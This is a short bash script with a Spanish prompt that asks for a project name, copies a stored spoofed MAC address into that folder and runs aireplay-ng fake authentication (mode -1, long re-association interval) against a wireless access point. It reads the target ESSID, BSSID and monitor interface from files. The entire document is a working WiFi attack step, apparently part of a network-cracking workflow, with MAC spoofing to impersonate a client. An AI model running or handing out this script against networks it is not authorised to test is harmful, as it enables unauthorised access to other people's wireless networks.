#!/bin/bash
read -p "Nombre del proyecto?: " archivo
sudo cp madmac $archivo
cd $archivo
sudo aireplay-ng -1 6000 -o 2 -q 10 -e `cat essid` -a `cat bssid` -h `cat madmac` `cat ../mon`
